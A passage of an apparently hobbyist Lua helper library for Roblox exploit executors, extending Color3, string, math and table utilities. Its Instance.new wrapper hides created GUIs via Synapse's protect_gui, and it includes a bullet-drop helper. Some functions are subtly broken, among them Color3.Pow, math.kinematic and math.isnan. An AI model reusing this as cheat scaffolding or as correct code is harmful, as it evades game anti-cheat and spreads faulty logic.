        local s, co = string.gsub(string.sub(str, 1, l or 1), find, rep)
        build = build .. s
        count = co + count
        str = string.sub(str, 1 + l)
    end
    return build, count
end
function Color3.blend(clr1, clr2, n) -- Mix n' match colors
	if typeof(clr1) ~= "Color3" or typeof(clr2) ~= "Color3" or (type(n) ~= "nil" and type(n) ~= "number") then
		Pepsi.Arg(clr1, "Color3", 1, "Color3.blend")
		Pepsi.Arg(clr2, "Color3", 2, "Color3.blend")
		Pepsi.Arg(n, {"nil", "number"}, 3, "Color3.blend")
	end
	n = tonumber(n or 0.5) or 0.5
	if n > 1 then
		n = n / 100
	end
	if typeof(clr1) == "Color3" and typeof(clr2) == "Color3" then
		return clr1:Lerp(clr2, n)
	end
	return Color3.new()
end
function Color3.Pow(clr, pow)
	if typeof(clr1) ~= "Color3" or typeof(mod) ~= "number" then
		Pepsi.Arg(clr, "Color3", 1, "Color3.Pow")
		Pepsi.Arg(mod, "number", 2, "Color3.Pow")
	end
	return Color3.new(math.pow(clr.r, pow), math.pow(clr.g, pow), math.pow(clr.b, pow))
end
function Color3.LerpGamma(clr1, clr2, amount, gamma)
	if typeof(clr1) ~= "Color3" or typeof(clr2) ~= "Color3" or (type(gamma) ~= "nil" and type(gamma) ~= "number") or (type(amount) ~= "nil" and type(amount) ~= "number") then
		Pepsi.Arg(clr1, "Color3", 1, "Color3.LerpGamma")
		Pepsi.Arg(clr2, "Color3", 2, "Color3.LerpGamma")
		Pepsi.Arg(amount, {"nil", "number"}, 3, "Color3.LerpGamma")
		Pepsi.Arg(gamma, {"nil", "number"}, 4, "Color3.LerpGamma")
	end
	amount, gamma = tonumber(amount or 0.5), tonumber(gamma or 1)
	return Color3.Pow(Color3.Pow(clr1, gamma):lerp(Color3.Pow(clr2, gamma), amount), math.inverse(gamma))
end
function Color3.FromHex(hex)
	if type(hex) ~= "string" then
		Pepsi.Arg(hex, {"string"}, 1, "Color3.FromHex")
	end
    hex = hex:gsub("#", "")
    return Color3.fromRGB(tonumber("0x" .. hex:sub(1, 2)), tonumber("0x" .. hex:sub(3, 4)), tonumber("0x" .. hex:sub(5, 6)))
end
function Color3.invert(clr, mod) -- Inverts a color3
	if typeof(clr) ~= "Color3" or typeof(mod) ~= "number" then
		Pepsi.Arg(clr, "Color3", 1, "Color3.invert")
		Pepsi.Arg(mod, {"nil", "number"}, 2, "Color3.invert")
	end
	mod = tonumber(mod or 1)
	if mod > 1 then
		mod = mod / 100
	end
	mod = math.clamp(mod, 0, 1)
	if typeof(clr) == "Color3" then
		return Color3.new(
			mod - clr.r,
			mod - clr.g,
			mod - clr.b
		)
	end
	return Color3.new()
end
--Color3.mix = Color3.blend
Color3.FromRGB = Color3.fromRGB
Color3.FromHSV = Color3.fromHSV
function string.scramble(minlen, maxlen) -- Return a cluster fuck of ascii spam
	if (type(maxlen) ~= "nil" and type(maxlen) ~= "number") or (type(minlen) ~= "nil" and type(minlen) ~= "number") then
		Pepsi.Arg(minlen, {"nil", "number"}, 1, "string.scramble")
		Pepsi.Arg(maxlen, {"nil", "number"}, 2, "string.scramble")
	end
	minlen = math.abs(tonumber(minlen or math.random(3, 20)))
	maxlen = math.abs(tonumber(maxlen or math.random(70, 120)))
	return (string.rep("x", math.random(minlen or math.random(3, 20), maxlen or math.random(70, 120))):gsub(".", function(...)
		return (string.rtl .. ({utf8.char(128105), utf8.char(10084), utf8.char(128139), utf8.char(127809), utf8.char(127764), utf8.char(128690), utf8.char(9851), utf8.char(128104), utf8.char(128103), utf8.char(128102), utf8.char(127465), utf8.char(128077), utf8.char(128078), utf8.char(10), utf8.char(13), utf8.char(879), utf8.char(95), utf8.char(61), utf8.char(40), utf8.char(41), utf8.char(91), utf8.char(93), utf8.char(34), utf8.char(39), utf8.char(92), utf8.char(47), utf8.char(123), utf8.char(125), utf8.char(64), utf8.char(35), utf8.char(36), utf8.char(37), utf8.char(94), utf8.char(38), utf8.char(42), utf8.char(32), utf8.char(804), utf8.char(1161), utf8.char(848), utf8.char(871), utf8.char(838), utf8.char(785), utf8.char(869), utf8.char(850), utf8.char(768), utf8.char(799), utf8.char(828), utf8.char(792), utf8.char(840), utf8.char(851), utf8.char(810), utf8.char(801), utf8.char(850), utf8.char(777), utf8.char(872), utf8.char(827), utf8.char(796), utf8.char(828), utf8.char(799), utf8.char(845), utf8.char(790), utf8.char(806), utf8.char(817), utf8.char(798), utf8.char(846), utf8.char(823), utf8.char(868), utf8.char(843), utf8.char(771), utf8.char(839), utf8.char(852), utf8.char(868), utf8.char(786), utf8.char(803), utf8.char(816), utf8.char(793), utf8.char(805), utf8.char(804), utf8.char(854), utf8.char(811), utf8.char(791), utf8.char(833), utf8.char(794), utf8.char(830), utf8.char(842), utf8.char(869), utf8.char(781), utf8.char(779), utf8.char(783), utf8.char(873), utf8.char(876), utf8.char(878), utf8.char(774), utf8.char(809), utf8.char(836), utf8.char(784), utf8.char(849), utf8.char(829), utf8.char(773), utf8.char(113), utf8.char(119), utf8.char(101), utf8.char(114), utf8.char(116), utf8.char(121), utf8.char(117), utf8.char(105), utf8.char(111), utf8.char(112), utf8.char(97), utf8.char(115), utf8.char(100), utf8.char(102), utf8.char(103), utf8.char(104), utf8.char(106), utf8.char(107), utf8.char(108), utf8.char(59), utf8.char(122), utf8.char(120), utf8.char(99), utf8.char(118), utf8.char(98), utf8.char(110), utf8.char(109), utf8.char(46), utf8.char(44), utf8.char(81), utf8.char(87), utf8.char(69), utf8.char(82), utf8.char(84), utf8.char(89), utf8.char(85), utf8.char(73), utf8.char(79), utf8.char(80), utf8.char(65), utf8.char(83), utf8.char(68), utf8.char(70), utf8.char(71), utf8.char(72), utf8.char(74), utf8.char(75), utf8.char(76), utf8.char(90), utf8.char(88), utf8.char(67), utf8.char(86), utf8.char(66), utf8.char(78), utf8.char(77), utf8.char(49), utf8.char(50), utf8.char(51), utf8.char(52), utf8.char(53), utf8.char(54), utf8.char(55), utf8.char(56), utf8.char(57), utf8.char(48), utf8.char(96), utf8.char(126)})[math.random(166)]) or tostring(... or string.rtl) or string.rtl
	end))
end
function string.random(min, max, symbols, spaces)
	if type(min) == "number" and type(max) ~= "number" then
		if spaces == nil and symbols == nil and type(max) == "boolean" then
			symbols = max
		end
		max = min
	end
	if symbols ~= nil and type(symbols) ~= "boolean" then
		symbols = Pepsi.Bool(symbols)
	end
	if symbols and spaces ~= nil and type(spaces) ~= "boolean" then
		spaces = Pepsi.Bool(spaces)
	end
	if type(min) ~= "number" then
		min = tonumber(min or 5)
	end
	if type(max) ~= "number" then
		max = tonumber(max or 30)
	end
	if max < 0 then
		max = math.abs(max)
	end
	if min < 0 then
		min = math.abs(min)
	end
	if max < min then
		min, max = max, min
	end
	if max <= 0 then
		return ""
	end
	return (string.gsub(string.rep(".", math.random(min, max)), ".", (symbols and function()
		return string.char(math.random((spaces and 32) or 33, 126))
	end) or function()
		return string[({"lower", "upper"})[math.random(2)]](string.char(math.random(65, 90)))
	end))
end
function Instance.new(class, parent, no_prot) -- 3rd Argument hides all gui classes via synapse users
	local i = old_new(class)
	if i and not Pepsi.no_protect_gui and not no_prot and typeof(i) == "Instance" and type(syn) == "table" and not syn.Compat and type(syn.protect_gui) == "function" and i:IsA("GuiBase") then
		pcall(syn.protect_gui, i)
	end
	if parent then
		i.Parent = parent
	end
	return i
end
function Instance.make(class, properties, disapear)
	if Pepsi.IsA(class, game) then
		class = class.ClassName
	end
	local nstance = Pepsi.ecall(Instance.new, class)
	if typeof(properties) == "Instance"  and typeof(nstance) == "Instance"  then
		nstance.Parent = properties
	elseif typeof(properties) == "table" and typeof(nstance) == "Instance" then
		for property, value in pairs(properties) do
			pcall(function()
				if property == "Protect" and type(syn) == "table" and not syn.Compat and type(syn.protect_gui) == "function" then
					pcall(syn.protectgui, nstance)
				else
					nstance[tostring(property)] = value
				end
			end)
		end
	end
	if type(disapear) == "number" and Pepsi.IsA(nstance, "Instance") then
		Pepsi.Service("Debris"):AddItem(nstance, disapear)
	end
	return nstance
end
--Instance.Make = Instance.make -- Added support for my GUI to lua
local oldround = math.round -- Roblox actually made one, a lil late though.
function math.round(n, d) -- Gotta do 'sum' rounding without floor
	if oldround and d == nil then
		return oldround(n)
	end
	n = tonumber(n or math.random()) or 0
	d = 10 ^ (d or 0)
	return ((n * d) + 0.5 - ((n * d) + 0.5) % 1) / d
end
function math.kinematic(startpos, velocity, duration, gravity) -- Bullet Drop calculator
	if (type(gravity) ~= "number" and type(gravity) ~= "nil") or type(duration) ~= "number" or (type(velocity) ~= "number" and typeof(velocity) ~= "CFrame" and typeof(velocity) ~= "Vector3") or (type(startpos) ~= "number" and typeof(startpos) ~= "CFrame" and typeof(startpos) ~= "Vector3") then
		Pepsi.Arg(startpos, {"number", "Vector3", "CFrame"}, 1, "math.kinematic")
		Pepsi.Arg(velocity, {"number", "Vector3", "CFrame"}, 2, "math.kinematic")
		Pepsi.Arg(duration, "number", 3, "math.kinematic")
		Pepsi.Arg(gravity, {"nil", "number"}, 4, "math.kinematic")
	end
	if type(startpos) == "number" then
		startpos = Pepsi.ToVector3(startpos).Y
	end
	if type(velocity) ~= "number" then
		velocity = Pepsi.ToVector3(velocity).Y
	end
	gravity = type(gravity) == "number" and gravity or workspace.Gravity
	local y = startpos + velocity * duration - (gravity * duration ^ 2) / 2
end
function math.percent(num, max, round, inverse)
	if type(num) ~= "number" or type(max) ~= "number" or (type(round) ~= "number" and type(round) ~= "nil") then
		Pepsi.Arg(num, {"number"}, 1, "math.percent")
		Pepsi.Arg(max, {"number"}, 2, "math.percent")
		Pepsi.Arg(round, {"number", "nil"}, 3, "math.percent")
	end
	local v = 0
	if inverse then
		v = (num * max) / 100
	else
		v = (num / max) * 100
	end
	if type(round) == "number" then
		return math.round(v, round)
	elseif round then
		return math.round(v)
	end
	return v
end
function math.isnan(num)
	return num and type(num) == "number" and false == (num > num) and false == (num < num) and false == (num == num)
end
function math.lerp(num1, num2, amount)
	if type(num1) ~= "number" or type(num2) ~= "number" or (type(amount) ~= "nil" and amount ~= "number") then
		Pepsi.Arg(num1, "number", 1, "math.lerp")
		Pepsi.Arg(num2, "number", 2, "math.lerp")
		Pepsi.Arg(amount, {"nil", "number"}, 3, "math.lerp")
	end
	amount = tonumber(amount or 0.5) or 0.5
	return num1 * (1 - amount) + num2 * amount
end
function math.relativerange(input, input_min, input_max, output_min, output_max)
	if type(input) ~= "number" or type(input_min) ~= "number" or type(input_max) ~= "number" or type(output_min) ~= "number" or type(output_max) ~= "number" then
		Pepsi.Arg(input, "number", 1, "math.relativerange")
		Pepsi.Arg(input_min, "number", 2, "math.relativerange")
		Pepsi.Arg(input_max, "number", 3, "math.relativerange")
		Pepsi.Arg(output_min, "number", 4, "math.relativerange")
		Pepsi.Arg(output_max, "number", 5, "math.relativerange")
	end
	return output_min * (1 - (input - input_min) / (input_max - input_min)) + output_max * (input - input_min) / (input_max - input_min)
end

-- Damnit, my electic pen ran out of batery, and i dont got anymore batteries that it requires. Because the fucking covid-19 shut down all my nearby stores...
-- I now have to use my lighter to exterminate moths

function math.inverselerp(x, y, a)
	if type(x) ~= "number" or type(y) ~= "number" or type(a) ~= "number" then
		Pepsi.Arg(x, "number", 1, "math.inverselerp")
		Pepsi.Arg(y, "number", 2, "math.inverselerp")
		Pepsi.Arg(a, "number", 3, "math.inverselerp")
	end
	return (a - x) / (y - x)
end
if (type(bit32) ~= "table" or type(bit32.bxor) ~= "function") and (type(bit) ~= "table" or type(bit.bxor) ~= "function") then
	function math.xor(e, f) -- Use bit32.bxor (faster)
		local g, h = 1, 0
		while e > 0 and f > 0 do
			local i, j = e % 2, f % 2
			if i ~= j then
				h = h + g
			end
			e, f, g = (e - i) / 2, (f - j) / 2, g * 2
		end
		if e < f then
			e = f
		end
		while e > 0 do
			local i = e % 2
			if i > 0 then
				h = h + g
			end
			e, g = (e - i) / 2, g * 2
		end
		return h
	end
else
	math.xor = (bit32 and bit32.bxor) or (bit and bit.bxor)
end
function math.range(n, min, max) -- Returns a number warped by arguments
	n = tonumber(n or 0) or 0
	min = tonumber(min or 0) or 0
	max = tonumber(max or math.huge) or math.huge
	return (n > max and max) or (n < min and min) or n or math.clamp(n, min, max) -- math.clamp does this too
end
function math.inverse(n) -- really stupid, but requested
	return tonumber(1 / tonumber(n or 1))
end
function math.coinflip() -- returns on a 50% chance
	return math.random(2) > 1
end
function math.chance(n)
	if type(n) ~= "nil" and type(n) ~= "number" then
		Pepsi.Arg(n, {"nil", "number"}, 1, "math.chance")
	end
	return math.random(tonumber(n or 2)) == 1
end
function math.ranfloat(min, max)
	if min and not max then
		max, min = min, max
	end
	min, max = tonumber(min or -1), tonumber(max or 1)
	if type(min) == "number" and type(max) == type(min) then
		local int = math.random(min, max)
		local float = math.random() * ({1, -1})[math.random(2)]
		local res = int + float
		if res < min then -- Ninjas have not more than 2 legs.
			return min
		end
		if res > max then
			return max
		end
		return tonumber(res or math.random())
	end
	return tonumber(math.random() * ({1, -1})[math.random(2)])
end
function math.hex(num, case) -- Turn a number into a hex form
	if tostring(num):find("%.") then
		return num
	end
	local p = ""
	num = tonumber(num or 0) or 0
	if 0 > num then
		p = "-"
		num = math.abs(num)
	end
	case = case or false
	return string[case and "upper" or "lower"](tostring(tostring(p or "") .. "0x" .. tostring(string.format((function(x)
		if x then
			return "%X"
		end
		return "%x"
	end)(case), tonumber(num or 0)))))
end
--math.percentof = math.percent
--math.calcpercent = math.percent
function table.allset(master, keys, vals, ignore_master, use_keys, show_errors)
	if (not ignore_master and robloxtype(master) ~= "table") or robloxtype(keys) ~= "table" or not Pepsi.IsBool(ignore_master) or not Pepsi.IsBool(use_keys) or not Pepsi.IsBool(show_errors) then
		if not ignore_master then
			Pepsi.Arg(master, {"table"}, 1, "table.allset")
		end
		Pepsi.Arg(keys, {"table"}, 2, "table.allset")
		ignore_master = Pepsi.CastBool(ignore_master)
		use_keys = Pepsi.CastBool(use_keys)
		show_errors = Pepsi.CastBool(show_errors)
	end
	if type(vals) == "table" then
		local lk, last = table.wrap(vals)
		for _, v in pairs(keys) do
			local x, e = pcall(rawset, master, v, last)
			if (show_errors == 1 or show_errors == true) and not x and e then
				warn(e)
			else
			    lk, last = table.wrap(vals, lk)
			end
		end
	elseif 1 == use_keys or true == use_keys then
		for k, v in pairs(keys) do
			local x, e = pcall(rawset, master, k, v)
			if (show_errors == 1 or show_errors == true) and not x and e then
				warn(e)
			end
		end
	else
		for _, v in pairs(keys) do
			local x, e = pcall(rawset, master, v, vals)
			if (show_errors == 1 or show_errors == true) and not x and e then
				warn(e)
			end
		end
	end
end
function table.wrap(tab, key)
	if type(tab) ~= "table" then
		Pepsi.Arg(tab, {"table"}, 1, "table.wrap")
	end
	local x, dk, dv = pcall(next, tab)
	if not x then
		return warn(dk)
	elseif dk == nil and dv == nil then
		return dk, dv
	end
	local x, k, v = pcall(next, tab, key)
	if x and (k ~= nil or v ~= nil) then
		return k, v
	end
	return dk, dv
end
function table.asort(t, sort_slot, rev) -- Array sort
	if type(t) ~= "table" or (type(sort_slot) ~= "number" and type(sort_slot) ~= "nil") or (type(rev) ~= "boolean" and type(rev) ~= "nil") then
		Pepsi.Arg(t, "table", 1, "table.esort")
		Pepsi.Arg(sort_slot, {"number", "nil"}, 2, "table.esort")
		Pepsi.Arg(rev, {"boolean", "nil"}, 3, "table.esort")
	end
	sort_slot = tonumber(sort_slot) or 2
	table.sort(t, function(a, b)
		if rev then
			return a[sort_slot] < b[sort_slot]
		end
		return a[sort_slot] > b[sort_slot]
	end)
	return t
end
function table.storekeys(t)
	if type(t) ~= "table" then
		Pepsi.Arg(t, {"table"}, 1, "table.storekeys")
	end
	local master = {}
	for k, v in pairs(t) do
		table.insert(master, {k, v})
	end
	return master or {}
end
function table.unstorekeys(t)
	if type(t) ~= "table" then
		Pepsi.Arg(t, {"table"}, 1, "table.unstorekeys")
	end
	local master = {}
	for _, v in pairs(t) do
		local key = rawget(v, 1)
		local val = rawget(v, 2)
		if nil ~= val and key ~= nil then
			rawset(master, key, val)
		end
	end
	return master or {}
end
function table.parse(tab, options, parser)
	if tab and type(tab) == "string" then
		local x, tab = pcall(table.fromjson, tab)
		if not x then
			Pepsi.Arg(tab, {"table"}, 1, "table.parse")
			return error("Could not parse json", 2)
		end
	end
	if type(tab) ~= "table" or (type(parser) ~= "nil" and type(parser) ~= "table") or (type(options) ~= "nil" and type(options) ~= "table") then
		Pepsi.Arg(tab, {"table"}, 1, "table.parse")
		Pepsi.Arg(options, {"nil", "table"}, 2, "table.parse")
		Pepsi.Arg(parser, {"nil", "table"}, 3, "table.parse")
	end
	options = table.overwrite({
		UseIndentation = true,
		IndentStr = string.rep(" ", 4),
		MaxDepth = 64,
		Indent = 0,
		Async = false,
		CaptureFuncs = false
	}, options)
	shared.Captured = shared.Captured or {}
	local Parse = table.overwrite({
	    Default = function(item)
	        return tostring(item)
	    end,
	    Instance = function(obj)
			local ret = tostring(obj:GetFullName()) .. "  (" .. obj.ClassName .. ")"
			if obj.ClassName == "ObjectValue" then
				ret = ret .. "  (Points to " .. obj.Value:GetFullName() .. ")"
			elseif obj:IsA("ValueBase") then
				ret = ret .. "  (Value: " .. parseval(obj.Value) .. ")"
			elseif obj:IsA("FaceInstance") then
				ret = ret .. "  (Decal: \"" .. tostring(obj.Texture):gsub("\n", "\\n") .. "\")"
			elseif pcall(function()
				return obj.Text
			end) then
				ret = ret .. "  (Text: \"" .. tostring(obj.Text):gsub("\n", "\\n") .. "\")"
			elseif pcall(function()
				return obj.Image
			end) then
				ret = ret .. "  (Image: \"" .. tostring(obj.Image):gsub("\n", "\\n") .. "\")"
			elseif pcall(function()
				return obj.TeamColor
			end) then
				ret = ret .. "  (Color: " .. parseval(obj.TeamColor) .. ")"
			elseif pcall(function()
				return obj.Adornee
			end) then
				ret = ret .. "  (Adornee: " .. parseval(obj.Adornee) .. ")"
			end
	        return ret
	    end,
	    Color3 = function(c)
	        return "Color3.new(" .. tostring(c.R) .. ", " .. tostring(c.G) .. ", " .. tostring(c.B) .. ")"
	    end,
	    Vector3 = function(c)
	        return "Vector3.new(" .. tostring(c.X) .. ", " .. tostring(c.Y) .. ", " .. tostring(c.Z) .. ")"
	    end,
		BrickColor = function(c)
			return "BrickColor.new(\"" .. c.Name .. "\")"
		end,
	    CFrame = function(c)
	        return "CFrame.new(" .. tostring(c) .. ")"
	    end,
	    string = function(str)
	        return "\"" .. tostring(str):gsub("\n", "\\n") .. "\""
	    end,
	    table = function(t, d)
			local pause = 0
	        d = tonumber(d or options.Indent or options.MaxDepth or 4) or options.Indent or options.MaxDepth or 4
	        local s = tostring(t)
	        if type(t) == "table" then
	            if options.Indent < options.MaxDepth then
	                s = "[" .. s .. tostring((next(t) and "\n") or "")
	                for key, value in pairs(t) do
						pause = 1 + pause
						if options.Async and pause > ((type(options.Async) == "number" and options.Async) or 100) then
							wait()
							pause = -50
						end
	                    options.Indent = 1 + options.Indent
	                    local parse_key = parseval(key)
	                    local parse_value = parseval(value)
	                    s = tostring(s .. tostring(GetIndent()) .. "[" .. tostring(parse_key) .. "] = " .. tostring(parse_value) .. "\n")
	                    options.Indent = options.Indent - 1
	                end
	            end
	        end
			if options.Indent >= options.MaxDepth then
	        	return tostring(s)
			end
			return tostring(tostring(s) .. tostring((next(t) and GetIndent()) or "") .. "]")
	    end,
	    ["function"] = function(f, d)
	        if tonumber(tonumber(d or 0) or 0) < 2 and options.CaptureFuncs then
	            local simp = tostring(string.gsub(tostring(f), ".", function(c)
	                if string.lower(c) == string.upper(c) and not tonumber(c) then
	                    return ""
	                end
	            end))
	            shared.Captured[simp] = f
	            return tostring(tostring(f) .. "  (Captured at shared.Captured." .. tostring(simp) .. ")")
	        end
	        return tostring(f)
	    end
	}, parser)
	function parseval(val)
		local f = Parse[typeof(val)] or Parse.Default
		if f then
			return f(val)
		end
		return tostring(val)
	end
	function GetIndent()
	    return options.UseIndentation and string.rep(options.IndentStr, options.Indent) or ""
	end
	return parseval(tab)
end
pcall(function()
	if type(setclipboard) == "function" then
		function table.save(tab)
			if type(tab) ~= "table" then
				Pepsi.Arg(tab, {"table"}, 1, "table.save")
			end
			return setclipboard and setclipboard(table.parse(tab))
		end
		if getgenv then
			getgenv().copyt = table.save
		end
	end
end)
function table.eachcall(tab, func, args) -- Namecall each child
	if type(tab) ~= "table" or type(func) ~= "string" or (type(args) ~= "nil" and type(args) ~= "table") then
		Pepsi.Arg(tab, "table", 1, "table.eachcall")
		Pepsi.Arg(func, "string", 2, "table.eachcall")
		Pepsi.Arg(args, {"nil", "table"}, 3, "table.eachcall")
	end
	if type(args) ~= "table" then
		args = {}
	end
	for _, val in pairs(tab) do
		val[func](val, unpack((type(args) == "table" and args) or {}))
	end
end
function table.esort(t, sort, sort_slot, rev) -- Extra sort
	if type(t) ~= "table" or (type(sort_slot) ~= "number" and type(sort_slot) ~= "nil") or (type(rev) ~= "boolean" and type(rev) ~= "nil") or (type(sort) ~= "boolean" and type(sort) ~= "nil") then
		Pepsi.Arg(t, "table", 1, "table.esort")
		Pepsi.Arg(sort, {"boolean", "nil"}, 2, "table.esort")
		Pepsi.Arg(sort_slot, {"number", "nil"}, 3, "table.esort")
		Pepsi.Arg(rev, {"boolean", "nil"}, 4, "table.esort")
	end
	local master = {}
	for k, v in pairs(t) do
		if type(v) == "table" then -- Boy, someone really missed the point of this function.
			table.insert(master, {k, unpack(v)})  -- But not to worry, Pepsi has made a temporary fix to their stupidity.
		else
			table.insert(master, {k, v})
		end
	end
	if sort then
		return table.asort(master, sort_slot, rev)
	end
	return master
end

-- Ok. Never Ever use a lighter to kill a moth, it melts into the dust of which accumlates after you smear it.

function table.count(t) -- Count dictionary tables
	local n = 0
	if type(t) == "table" then
		for key, value in pairs(t or {}) do
			n = 1 + n
		end
	end
	return tonumber(n or 0)
end
function table.tojson(tab)
	if type(tab) ~= "table" then
		Pepsi.Arg(tab, "table", 1, "table.tojson")
	end
	return Pepsi.Service("HttpService"):JSONEncode(tab)
end
function table.fromjson(str)
	if type(str) ~= "string" then
		Pepsi.Arg(str, "string", 1, "table.fromjson")
	end
	return Pepsi.Service("HttpService"):JSONDecode(str)
end
function table.xml(t) -- Converts a table into an xml string // Inspired by Shell64 // WORK IN PROGRESS
	if type(t) ~= "table" then
		Pepsi.Arg(t, "table", 1, "table.xml")
	end
	return warn("wip")--parse(t or {})
end
function table.sert(...)
	old_ins(...)
	return (...) or {}
end
function table.sort(t, f, ...) -- Table.sort now returns the table
	old_sort(t, f, ...)
	return t or {}
end
function table.clear(t, v) -- Table begone and Pepsied
	if Pepsi.IsA(t, {}) then
		for index, value in pairs(t or {}) do
			if value == v then
				t[index] = nil
			end
		end
	end
	return t or {}
end
function table.filterfunc(objects, func, async)
	if (type(async) ~= "nil" and type(async) ~= "boolean" and typeof(async) ~= "RBXScriptSignal") or (type(objects) ~= "table" and typeof(objects) ~= "Instance") or type(func) ~= "function" then
		Pepsi.Arg(objects, {"table", "Instance"}, 1, "table.filterfunc")
		Pepsi.Arg(func, "function", 2, "table.filterfunc")
		Pepsi.Arg(async, {"RBXScriptSignal", "boolean", "nil"}, 3, "table.filterfunc")
	end
	if typeof(objects) == "Instance" then
		objects = objects:GetChildren()
	end
	local items = {}
	for _, obj in pairs(objects) do
		if func(obj) then
			table.insert(items, obj)
		end
		if async then
			if typeof(async) == "RBXScriptSignal" then
				async:Wait()
			else
				Pepsi.Rs:Wait()
			end
		end
	end
	return items
end
function table.filter(t, v) -- Returns a table with values that matched arguments
	if Pepsi.IsA(t, {}) then
		for index, value in pairs(t or {}) do
			if not Pepsi.IsA(value, v) then
				t[index] = nil
			end
		end
	end
	return t or {}
end
function table.merge(...) -- Merge tables
	local tables = {...}
	local master = {}
	for _, t in pairs(tables) do
		if type(t) == "table" then
			for k, v in pairs(t) do
				master[k] = v
			end
		else
			table.insert(master, t)
		end
	end
	return master
end
function table.overwrite(over, write, set)
	local master = (type(over) == "table" and over) or {}
	write = (type(write) == "table" and write) or {}
	set = not not set
	for k, v in pairs(write) do
		master[k] = v
		if set then
			over[k] = v
		end
	end
	return (set and over) or master or {}
end
function table.softmerge(...)
	local tables = {...}
	local master = {}
	for _, t in pairs(tables) do
		if type(t) == "table" then
			for k, v in pairs(t) do
				if rawget(master, k) ~= nil then
					master[k] = v
				elseif type(k) == "number" then
					table.insert(master, v)
				end
			end
		else
			table.insert(master, t)
		end
	end
	return master
end
function table.add(...)
	local async = false
	local tabs = {...}
	if type(tabs[1]) ~= "table" or type(tabs[2]) ~= "table" then
		Pepsi.Arg(tabs[1], "table", 1, "table.add")
		Pepsi.Arg(tabs[2], "table", 2, "table.add")
	end
	if #tabs > 2 and type(tabs[#tabs]) == "boolean" then	
		async = table.remove(tabs, #tabs)
	end
	if #tabs > 2 then
		for k = 3, #tabs do
			if type(tabs[k]) ~= "nil" and type(tabs[k]) ~= "table" then
				Pepsi.Arg(tabs[k], {"nil", "table"}, k, "table.add")
			end
		end
	end
	local master = {}
	for _, tab in pairs(tabs) do
		for k, v in pairs(tab) do
			if type(k) == "number" then
				table.insert(master, v)
			elseif master[k] == nil then
				master[k] = v
			end
			if async then
				if typeof(async) == "RBXScriptSignal" then
					async:Wait()
				else
					Pepsi.Rs:Wait()
				end
			end
		end
		if async then
			if typeof(async) == "RBXScriptSignal" then
				async:Wait()
			else
				Pepsi.Rs:Wait()
			end
		end
	end
	return master
end
function table.negate(tab, tab2, match_keys)
	if type(tab) ~= "table" or type(tab2) ~= "table" or (type(match_keys) ~= "nil" and type(match_keys) ~= "boolean") then
		Pepsi.Arg(tab, "table", 1, "table.negate")
		Pepsi.Arg(tab2, "table", 2, "table.negate")
		Pepsi.Arg(match_keys, {"nil", "boolean"}, 3, "table.negate")
	end
	if not match_keys then
		local master = table.dictionary(tab)
		for k, v in pairs(tab2) do
			master[v] = nil
		end
		return table.keys(master)
	end
	local master = tab
	for k, v in pairs(tab) do
		for k2, v2 in pairs(tab2) do
			if rawequal(k, k2) and rawequal(v, v2) then
				if type(k) == "number" then
					table.remove(master, k)
				else
					master[k] = nil
				end
			end
		end
	end
	return master
end
function table.ksort(t) -- Sort table by keys instead of values
	if Pepsi.IsA(t, "table") then
		local tt = {}
		for k, v in pairs(t) do
			table.insert(tt, tostring(k))
		end
		local nt = {}
		table.sort(tt)
		for k, v in pairs(tt) do
			nt[v] = t[v]
		end
		return nt
	end
	return t or {}
end
function table.flipkeys(t)
	if type(t) == "table" then
		local nt = {}
		for k, v in pairs(t) do
			nt[v] = k
		end -- Dogs have four legs
		return nt
	end
end
function table.shuffle(t)
	local nt = {}
	for i = #t, 1, -1 do
		local j = math.random(i)
		t[i], t[j] = t[j], t[i]
		table.insert(nt, t[i])
	end
	return nt or t or {}
end
function table.show(depth, ...)
	local insp = false
	local tabs = {...}
	if type(depth) ~= "number" then
		tabs, depth = {depth, ...}, 4
	end
	function printt(tab, d, i)
		i = not not i
		d = tonumber(tonumber(d or 0) or 0)
		if d > depth then
			return
		end
		local pre = string.rep(" ", 3 * d)
		for key, val in pairs(tab) do
			print(pre, key, val)
			Pepsi.Tick:Wait()
			if type(key) == "table" then
				printt(key, d + 1)
			end
			if type(val) == "table" then
				printt(val, d + 1)
			end
			if i then
				if typeof(key) == "Instance" then
					printt(key:GetChildren(), 1 + d, true)
				end
				if typeof(val) == "Instance" then
					printt(val:GetChildren(), 1 + d, true)
				end
			end
		end
	end
	if #tabs == 1 and typeof(tabs[1]) == "Instance" then
		insp = true
	end
	for key, val in pairs(tabs) do
		Pepsi.Tick:Wait()
		print(key, val)
		if type(key) == "table" then
			printt(key, 0)
		end
		if type(val) == "table" then
			printt(val, 0)
		end
		if insp then
			if typeof(key) == "Instance" then
				printt(key:GetChildren(), 0, true)
			end
			if typeof(val) == "Instance" then
				printt(val:GetChildren(), 0, true)
			end
		end
	end
end
function table.keys(...)
	local tabs = {...}
	local keys = {}
	local names = {}
	for _, v in pairs(tabs) do
		if type(v) == "table" then
			for k, _ in pairs(v) do
				if not names[k] then
					names[k] = true
					table.insert(keys, k)
				end
			end
		end
	end
	return keys or names or {}
end
function table.clone(tab, maxdepth)
	maxdepth = tonumber(tonumber(maxdepth or 4) or 4)
	if type(tab) == "table" then
		function cloner(t, d)
			local cloned = {}
			d = tonumber(tonumber(d or 0) or 0)
			if d > maxdepth or "table" ~= type(t) then
				return
			end
			for key, val in pairs(t) do
				if type(val) == "table" and d + 1 <= maxdepth then
					val = cloner(val, d + 1) or val
				end
				cloned[key] = val
			end
			return cloned or {}
		end
		return cloner(tab, 0) or {}
	end
	return {}
end
function table.print(customfunc, ...)
	local tables = {...}
	if type(customfunc) == "table" or typeof(customfunc) == "Instance" then
		table.insert(tables, 1, customfunc)
		customfunc = print
	end
	for k, v in pairs(tables) do
		if typeof(v) == "Instance" then
			tables[k] = v:GetChildren()
		end
	end
	if not next(tables) then
		return assert(customfunc or print, "Missing print function?")("Table empty")
	end
	for k, v in pairs(tables) do
		if type(v) == "table" then
			table.foreach(v, customfunc)
		else
			print(v)
		end
	end
end
function table.rsort(tab)
	table.sort(tab, function(a, b)
		return a > b
	end)
	return tab or {}
end
function table.eachfor(tab, func) -- table.foreach but arguments flipped
	for v, k in pairs(tab) do
		func(k, v)
	end
end
function table.dictionary(t, def, set)
	local nt = {}
	if def == nil then
		def = true
	end
	if type(t) == "table" then
		for k, v in pairs(t) do
			nt[v] = def
			if set then
				t[v] = def
			end
		end
	end
	return nt or {}
end

-- I have to find a way to kill this fucking moth without my electric pen, and without extensive heat. 

function table.each(typ, tab, func) -- table.foreach but arguments flipped
	if func == nil and type(tab) == "function" and type(typ) == "table" then
		typ, tab, func = true, typ, tab
	end
	for k, v in pairs(tab) do
